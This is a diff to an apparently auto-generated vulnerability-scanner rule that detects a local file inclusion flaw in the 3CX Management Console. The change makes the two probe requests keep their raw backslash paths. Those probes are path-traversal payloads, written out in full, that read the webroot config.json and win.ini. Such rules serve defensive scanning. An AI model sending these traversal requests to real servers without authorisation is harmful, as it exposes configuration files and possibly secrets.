@@ -3,7 +3,7 @@ id: "cortex.community:3cx-management-console"
 rule_version: "1.0.0"
 requires:
   engine_api: 1
-  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
+  capabilities: ["http.standard.v1", "http.preserve_raw_path.v1", "matchers.basic.v1", "proof.signal.v1"]
 info:
   name: "3CX Management Console - Local File Inclusion"
   description: "3CX Management Console is vulnerable to local file inclusion. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
@@ -20,9 +20,9 @@ finding:
 execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
 steps:
   - id: "probe0"
-    request: { method: "GET", path: "/Electron/download/windows/..\\..\\..\\Http\\webroot\\config.json" }
+    request: { method: "GET", path: "/Electron/download/windows/..\\..\\..\\Http\\webroot\\config.json", path_mode: "preserve_raw" }
   - id: "probe1"
-    request: { method: "GET", path: "/Electron/download/windows/\\windows\\win.ini" }
+    request: { method: "GET", path: "/Electron/download/windows/\\windows\\win.ini", path_mode: "preserve_raw" }
 proof:
   kind: "signal.v1"
   assertions:
